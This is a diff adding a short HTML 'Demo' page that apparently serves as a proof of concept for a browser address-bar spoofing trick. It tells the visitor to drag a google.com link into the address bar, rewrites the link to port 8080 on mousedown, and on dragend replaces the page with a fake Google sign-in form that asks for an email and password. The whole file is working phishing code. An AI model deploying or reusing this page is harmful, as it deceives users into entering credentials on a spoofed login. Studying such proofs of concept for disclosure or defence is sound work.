@@ -1,0 +1,97 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Demo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #fff;
+    }
+    .container {
+      max-width: 360px;
+      margin: 80px auto;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 32px;
+      box-shadow: 0 2px 8px rgba(0,0,0,.2);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    .logo img {
+      width: 92px;
+    }
+    h1 {
+      font-size: 22px;
+      text-align: center;
+      margin-bottom: 24px;
+      color: #202124;
+    }
+    .input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: #1a73e8;
+      border: none;
+      color: #fff;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+    .link {
+      display: block;
+      margin-top: 16px;
+      text-align: center;
+      font-size: 13px;
+      color: #1a73e8;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+<p>➡️ Drag and drop this link into the current tab’s address bar:</p>
+<a id="bb" onmousedown="ee()" href="https://www.google.com/">www.google.com</a>
+
+<script>
+  document.addEventListener("dragend", function () {
+    // Replace the page with a spoofed Google login
+    document.open();
+    document.write(`
+      <title>Google</title>
+      <div class="container">
+        <div class="logo">
+          <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
+        </div>
+        <h1>Sign in</h1>
+        <input class="input" type="email" placeholder="Email or phone">
+        <input class="input" type="password" placeholder="Enter your password">
+        <button class="btn">Next</button>
+        <a href="#" class="link">Forgot email?</a>
+      </div>
+    `);
+    document.close();
+  });
+
+  function ee() {
+    // Subtle trick: add a port to make address bar show slightly different form
+    document.getElementById('bb').setAttribute('href', 'https://www.google.com:8080');
+  }
+</script>
+
+</body>
+</html>
